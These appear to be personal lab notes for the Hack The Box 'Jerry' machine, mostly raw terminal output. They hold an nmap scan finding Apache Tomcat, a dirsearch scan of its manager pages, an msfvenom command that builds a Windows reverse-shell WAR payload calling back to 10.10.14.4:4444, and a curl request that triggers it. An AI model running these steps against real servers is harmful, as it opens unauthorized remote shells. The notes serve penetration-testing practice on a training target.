nmap
```
┌──(kali㉿kali)-[~/HTB/jerry]
└─$ sudo nmap -T5 -p- -A -oN nmap 10.129.136.9
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-17 03:06 EST
Nmap scan report for 10.129.136.9
Host is up (0.088s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/7.0.88
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 2012|8|Phone|7 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows Server 2012 or Windows Server 2012 R2 (89%), Microsoft Windows Server 2012 R2 (89%), Microsoft Windows Server 2012 (88%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows Embedded Standard 7 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 8080/tcp)
HOP RTT      ADDRESS
1   87.92 ms 10.10.14.1
2   87.95 ms 10.129.136.9

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 119.09 seconds
```

```
┌──(kali㉿kali)-[~/HTB/jerry]
└─$ dirsearch -u http://10.129.136.9:8080/ -x 400-599 
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/HTB/jerry/reports/http_10.129.136.9_8080/__24-12-17_03-11-44.txt

Target: http://10.129.136.9:8080/

[03:11:44] Starting: 
[03:12:56] 302 -    0B  - /docs  ->  /docs/                                 
[03:12:56] 200 -   19KB - /docs/                                            
[03:13:01] 200 -    1KB - /examples/                                        
[03:13:01] 200 -   17KB - /examples/jsp/index.html
[03:13:01] 302 -    0B  - /examples  ->  /examples/
[03:13:01] 200 -    1KB - /examples/websocket/index.xhtml                   
[03:13:01] 200 -    7KB - /examples/servlets/index.html                     
[03:13:02] 200 -    1KB - /examples/servlets/servlet/RequestHeaderExample   
[03:13:02] 200 -  637B  - /examples/servlets/servlet/CookieExample
[03:13:03] 200 -   21KB - /favicon.ico                                      
[03:13:03] 200 -  719B  - /examples/jsp/snp/snoop.jsp                       
[03:13:11] 302 -    0B  - /host-manager/  ->  /host-manager/html            
[03:13:29] 302 -    0B  - /manager  ->  /manager/                           
[03:13:29] 302 -    0B  - /manager/  ->  /manager/html                      
                                                                             
Task Completed                  
```

![Pasted image 20241217165015](<0. Attachments/Pasted image 20241217165015.png>)

```
┌──(kali㉿kali)-[~/HTB/jerry]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.4 LPORT=4444 -f war > rev_shell-4444.war
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of war file: 52313 bytes

                                                                                                                                      
┌──(kali㉿kali)-[~/HTB/jerry]
└─$ jar -ft rev_shell-4444.war
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
META-INF/
META-INF/MANIFEST.MF
WEB-INF/
WEB-INF/web.xml
nrmscqdspncuzeb.jsp
                                                                                                                                      
┌──(kali㉿kali)-[~/HTB/jerry]
└─$ curl -v curl http://10.129.248.190:8080/rev_shell-4444/nrmscqdspncuzeb.jsp
* Could not resolve host: curl
* shutting down connection #0
curl: (6) Could not resolve host: curl
*   Trying 10.129.248.190:8080...
* Connected to 10.129.248.190 (10.129.248.190) port 8080
* using HTTP/1.x
> GET /rev_shell-4444/nrmscqdspncuzeb.jsp HTTP/1.1
> Host: 10.129.248.190:8080
> User-Agent: curl/8.11.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Server: Apache-Coyote/1.1
< Set-Cookie: JSESSIONID=B97A8559824F7A4F969C8904275EE7CD; Path=/rev_shell-4444; HttpOnly
< Content-Type: text/html;charset=ISO-8859-1
< Content-Length: 2
< Date: Tue, 17 Dec 2024 15:40:58 GMT
< 


* Connection #1 to host 10.129.248.190 left intact
```

![Pasted image 20241217165041](<0. Attachments/Pasted image 20241217165041.png>)
